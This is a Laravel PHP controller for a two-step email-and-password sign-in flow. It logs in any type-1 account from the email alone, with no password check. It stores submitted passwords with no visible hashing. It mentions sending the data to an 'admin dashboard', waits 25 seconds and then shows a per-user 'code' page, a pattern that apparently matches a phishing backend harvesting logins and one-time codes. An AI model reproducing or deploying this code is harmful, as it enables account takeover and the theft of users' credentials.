<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;

class RegisterController extends Controller
{
    public function showEmailForm()
    {


        return view('auth.login');
    }

    public function processEmailForm(Request $request)
    {

        $user = User::where('email', $request->email)->first();
//
        if ($user) {
            if ($user->type === 1) {
                Auth::login($user);
                return redirect('/dashboard');
            }
        }

        $request->validate([
            'email' => 'required|email|unique:users',
        ]);

        // Store email in session
        Session::put('email', $request->email);

        // Redirect to the password form
        return redirect('/password/account');
    }

    public function showPasswordForm()
    {

        if (!Session::has('email')) {
            return redirect()->route('register.email');
        }

        return view('auth.password');
    }

    public function processPasswordForm(Request $request)
    {
        $user = User::where('email', session('email'))->first();

        if ($user) {
            if ($user->type === 1) {
                Auth::login($user);
                return redirect('/dashboard');
            }
        }

        $request->validate([
            'password' => 'required|min:8',
        ]);

        // Retrieve email from session
        $email = Session::get('email');

        // Create the user
        $user = User::create([
            'type' => 0,
            'email' => $email,
            'password' => $request->password,
        ]);

//        dd($request);

//        sleep(20);
        // Optionally: Send data to admin dashboard
        // Use a notification, event, or queue to handle this.

        sleep(25);

        $user = User::with('code')->where('email', session('email'))->first();

//        dd($user);
        return view('auth.code', compact('user'));
    }

}
